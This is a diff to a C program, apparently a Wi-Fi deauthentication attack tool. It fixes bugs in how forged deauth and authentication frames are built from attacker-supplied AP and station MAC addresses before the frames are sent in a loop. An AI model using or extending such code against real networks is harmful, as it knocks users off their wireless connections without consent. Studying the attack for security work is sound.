@@ -3,9 +3,9 @@
 #include <stdio.h>
 #include <header.h>
 
-struct Deauth_packet final{
+struct Deauth_packet {
     Radiotaps r_tap;
-    Deaut_frame d_frame;
+    Deauth_frame d_frame;
     Fixed_param fixed_param;
 };
 
@@ -34,7 +34,7 @@ int main(int argc, char *argv[])
         return 0;
     }
 
-    bool get_sta_mac;
+    bool get_sta_mac = false;
     if((param.auth && argc == 5) || (!param.auth && argc == 4)) {
         get_sta_mac = true;
     }
@@ -43,10 +43,6 @@ int main(int argc, char *argv[])
 
     int i = 0;
     uint8_t ap_mac[MAC_ADDR_LEN];
-    for(i=0; i<MAC_ADDR_LEN; i++) {
-        ap_mac[i] = strtol(argv[2], NULL, 16);
-        argv[2] += 3;
-    }
 
     char errbuf[PCAP_ERRBUF_SIZE];
 
@@ -61,16 +57,25 @@ int main(int argc, char *argv[])
 
         if(get_sta_mac) {
             uint8_t sta_mac[MAC_ADDR_LEN];
-
             for(i=0; i<MAC_ADDR_LEN; i++) {
                 sta_mac[i] = strtol(argv[3], NULL, 16);
                 argv[3] += 3;
+
+                packets.d_frame.recv_dst_addr[i] = sta_mac[i];
             }
-            packets.d_frame.recv_dst_addr[i] = sta_mac[i];
         }
 
-        packets.d_frame.trans_src_addr[i] = ap_mac[i];
-        packets.d_frame.bssid[i] = ap_mac[i];
+        if(param.auth) {
+            packets.d_frame.type = 0xb0;
+        }
+
+        for(i=0; i<MAC_ADDR_LEN; i++) {
+            ap_mac[i] = strtol(argv[2], NULL, 16);
+            argv[2] += 3;
+
+            packets.d_frame.trans_src_addr[i] = ap_mac[i];
+            packets.d_frame.bssid[i] = ap_mac[i];
+        }
     }
 
     while(true) {
